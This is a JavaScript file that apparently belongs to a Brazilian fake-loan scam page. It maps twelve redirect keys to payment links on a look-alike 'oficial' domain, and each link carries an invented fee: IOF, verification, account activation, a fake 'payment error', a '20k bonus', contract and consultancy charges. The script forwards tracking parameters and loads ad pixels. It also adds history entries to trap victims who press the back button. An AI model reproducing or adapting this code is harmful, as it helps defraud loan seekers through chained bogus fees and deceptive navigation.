const baseLinks = {
    up1: "https://pay.pagamentosfacilidadosoficial.shop/bz5KZbVOeP4Z7dL", // IOF
    up2: "https://pay.pagamentosfacilidadosoficial.shop/yOeXZKlB5AQGAQa", // Taxa de verificação de IOF
    up3: "https://pay.pagamentosfacilidadosoficial.shop/z0qn35dB9Oyg98m", // Seguro Prestamista "tarifa de cadastro"
    up4: "https://pay.pagamentosfacilidadosoficial.shop/a9ArZMlBybX37xj", // NFe
    up5: "https://pay.pagamentosfacilidadosoficial.shop/meABG9d6vKbZ6Ea", // Ativar conta
    up6: "https://pay.pagamentosfacilidadosoficial.shop/NDr8gmKwLjOZBmj", // Taxa de registro do contrato
    up7: "https://pay.pagamentosfacilidadosoficial.shop/65XDZB8Byj7gVJw", // Parabéns, 20k adicional
    up8: "https://pay.pagamentosfacilidadosoficial.shop/N1nVZpYwLWYGlM6", // Erro no pagamento - 14,06
    up9: "https://pay.pagamentosfacilidadosoficial.shop/DPXw3Xea6R8Zzmp", // APP - 11,99
    up10:"https://pay.pagamentosfacilidadosoficial.shop/ODAK3LlzyNV3E6V", // Taxa de Abertura TAC - 16,92
    up11:"https://pay.pagamentosfacilidadosoficial.shop/lDW0ZaJ1wn4GN7E",// Taxa de Consultoria Financeira - 19,53
    up12:"https://pay.pagamentosfacilidadosoficial.shop/KV603kowxLm3w8y" // Taxa de Processamento Administrativo - 31,92

};

function redirect(key) {
    try {
        if (!baseLinks[key]) {
            throw new Error(`Link para ${key} não encontrado!`);
        }

        const url = new URL(baseLinks[key]);
        url.search = new URLSearchParams(window.location.search).toString();

        window.location.href = url.href;
        
    } catch (error) {
        console.error('Erro no redirecionamento:', error);
        alert(`Erro: ${error.message || "Não foi possível redirecionar"}`);
    }
}



// UTMIFY, troque o pixel só aqui, belê?
(function() {
 window.googlePixelId = "688817c3b0633f5bb4fabb5c";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
  document.head.appendChild(a);
})();


(function() {
    const script = document.createElement('script');
    
    script.src = 'https://cdn.utmify.com.br/scripts/utms/latest.js';
    script.setAttribute('data-utmify-prevent-xcod-sck', '');
    script.setAttribute('data-utmify-prevent-subids', '');
    script.async = true;
    script.defer = true;

    document.head.appendChild(script);
})();


// Adiciona duas entradas no histórico para capturar a navegação para trás
history.pushState({}, '', location.href);
history.pushState({}, '', location.href);